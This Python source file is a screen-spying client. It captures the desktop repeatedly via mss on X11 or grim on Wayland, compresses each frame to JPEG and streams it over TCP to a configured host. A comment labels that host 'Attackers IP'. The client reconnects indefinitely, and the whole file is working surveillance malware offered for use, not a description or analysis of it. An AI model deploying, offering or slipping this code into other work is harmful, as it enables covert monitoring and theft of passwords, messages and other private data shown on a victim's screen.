import socket
import struct
import io
import time
import sys
import os
import subprocess
from PIL import Image

# --- Configuration ---
SERVER_HOST = '192.168.1.101' # Change this to Attackers IP
SERVER_PORT = 1234
JPEG_QUALITY = 80
FPS = 30
RETRY_INTERVAL = 5         # Seconds to wait before retrying connection

# --- Global Variables ---
client_socket = None
is_running = True
display_server_type = None # Will be 'x11' or 'wayland'
capture_method = None # Will be the function to call for screen capture

# --- Screen Capture Implementations ---

def capture_screen_x11(sct_instance, monitor_info):
    """Captures screen using mss for X11."""
    try:
        sct_img = sct_instance.grab(monitor_info)
        img = Image.frombytes("RGB", sct_img.size, sct_img.rgb)
        return img
    except Exception as e:
        print(f"X11 screen capture (mss) error: {e}")
        return None

def capture_screen_wayland():
    """
    Captures screen using grim for Wayland.
    Assumes 'grim' is installed and available in PATH.
    It captures the entire screen to a BytesIO object.
    """
    try:
        # Use grim to capture the entire screen.
        # -o means output to stdout.
        # This will capture the whole screen or whatever grim defaults to.
        # For multi-monitor setups, grim might capture all monitors into one image.
        process = subprocess.run(
            ['grim', '-'], # Capture to stdout
            capture_output=True,
            check=True
        )
        img_bytes = process.stdout
        img = Image.open(io.BytesIO(img_bytes))
        return img
    except FileNotFoundError:
        print("Error: 'grim' command not found. Please install grim for Wayland screen capture.")
        print("You might need 'slurp' as well for selection, but grim alone captures full screen.")
        return None
    except subprocess.CalledProcessError as e:
        print(f"Wayland screen capture (grim) failed: {e}")
        print(f"Stdout: {e.stdout.decode()}")
        print(f"Stderr: {e.stderr.decode()}")
        return None
    except Exception as e:
        print(f"An unexpected error occurred during Wayland capture: {e}")
        return None

def detect_display_server():
    """Detects if the current session is Wayland or X11."""
    global display_server_type, capture_method

    session_type = os.environ.get('XDG_SESSION_TYPE')
    if session_type == 'wayland':
        display_server_type = 'wayland'
        capture_method = capture_screen_wayland
        print("Detected Wayland session. Using 'grim' for screen capture.")
        print("NOTE: 'grim' must be installed (e.g., sudo apt install grim) for this to work.")
        print("For multi-monitor support on Wayland, 'grim' might behave differently than mss.")
        print("Ensure 'grim' has permission to capture, your Wayland compositor might ask.")
    elif session_type == 'x11':
        display_server_type = 'x11'
        print("Detected X11 session. Using 'mss' for screen capture.")
    else:
        # Fallback for older systems or unexpected environments
        if os.environ.get('DISPLAY'):
            display_server_type = 'x11'
            print("Detected DISPLAY environment variable. Assuming X11 session.")
            print("NOTE: If this is incorrect (e.g., you are on Wayland), capture will fail.")
        else:
            print("Could not reliably detect display server type. Assuming X11 as a fallback.")
            print("Screen capture might fail if this is incorrect.")
            display_server_type = 'x11' # Default to x11 if detection fails

def send_screen_loop():
    """
    Captures the screen, compresses it, and sends it to the server.
    This function continuously runs in a loop.
    """
    global is_running, client_socket, display_server_type, capture_method

    if display_server_type == 'x11':
        try:
            import mss
            sct = mss.mss()
            # Get information of monitor 1 (primary monitor)
            # You can change this if you have multiple monitors
            monitor = sct.monitors[1]
            capture_method = lambda: capture_screen_x11(sct, monitor)
        except mss.exception.ScreenShotError as e:
            print(f"MSS initialization error: {e}")
            print("Ensure X11 display server is running and accessible.")
            is_running = False
            return
        except ImportError:
            print("Error: 'mss' library not found. Please install it for X11 screen capture.")
            is_running = False
            return
    elif display_server_type == 'wayland':
        # capture_method is already set to capture_screen_wayland
        pass # No specific initialization needed for grim

    if not capture_method:
        print("No valid screen capture method available. Exiting send_screen_loop.")
        is_running = False
        return

    try:
        while is_running:
            start_time = time.time()

            # 1. Capture the screen using the detected method
            img = capture_method()
            if img is None:
                print("Screen capture failed. Retrying...")
                time.sleep(1) # Small delay before retrying capture
                continue

            # 2. Compress the image to JPEG bytes
            img_byte_arr = io.BytesIO()
            img.save(img_byte_arr, format='JPEG', quality=JPEG_QUALITY)
            image_data = img_byte_arr.getvalue()

            # 3. Send the size of the image data (4 bytes, unsigned long)
            client_socket.sendall(struct.pack('<L', len(image_data)))

            # 4. Send the actual image data
            client_socket.sendall(image_data)

            # Control frame rate
            elapsed_time = time.time() - start_time
            if elapsed_time < (1 / FPS):
                time.sleep((1 / FPS) - elapsed_time)

    except (socket.error, ConnectionResetError) as e:
        print(f"Connection lost or error during data transfer: {e}")
        print("Attempting to reconnect...")
    except Exception as e:
        print(f"An unexpected error occurred in send_screen_loop: {e}")
        # Mark as not running to trigger outer loop to retry or exit
        is_running = False
    finally:
        pass # The outer start_client loop handles reconnection/cleanup

def close_client():
    """Closes the client socket and shuts down the client."""
    global is_running, client_socket
    is_running = False
    print("Shutting down client...")
    if client_socket:
        try:
            client_socket.shutdown(socket.SHUT_RDWR)
            client_socket.close()
            print("Client socket closed.")
        except OSError as e:
            print(f"Error closing client socket: {e}")
    sys.exit(0) # Exit the script cleanly

def start_client():
    """Initializes the client socket and connects to the server, with retry logic."""
    global client_socket, is_running

    detect_display_server() # Detect display server once at startup

    while True: # Continuous retry loop
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            print(f"Attempting to connect to {SERVER_HOST}:{SERVER_PORT}...")
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            print("Connected to server.")
            is_running = True # Reset is_running to True on successful connection
            send_screen_loop() # Start sending screens once connected
            # If send_screen_loop returns, it means the connection was lost or an error occurred.
            # The loop will then go for a retry.

        except ConnectionRefusedError:
            print(f"Connection refused by {SERVER_HOST}:{SERVER_PORT}. Retrying in {RETRY_INTERVAL} seconds...")
        except socket.timeout:
            print(f"Connection attempt timed out to {SERVER_HOST}:{SERVER_PORT}. Retrying in {RETRY_INTERVAL} seconds...")
        except socket.error as e:
            print(f"Socket error during connection: {e}. Retrying in {RETRY_INTERVAL} seconds...")
        except Exception as e:
            print(f"An unexpected error occurred during client startup: {e}. Retrying in {RETRY_INTERVAL} seconds...")
        finally:
            # Always close the socket if it was created, before retrying
            if client_socket:
                try:
                    client_socket.close()
                except OSError as e:
                    print(f"Error closing socket before retry: {e}")
            if is_running: # Only wait if we expect to retry
                time.sleep(RETRY_INTERVAL)

if __name__ == "__main__":
    start_client()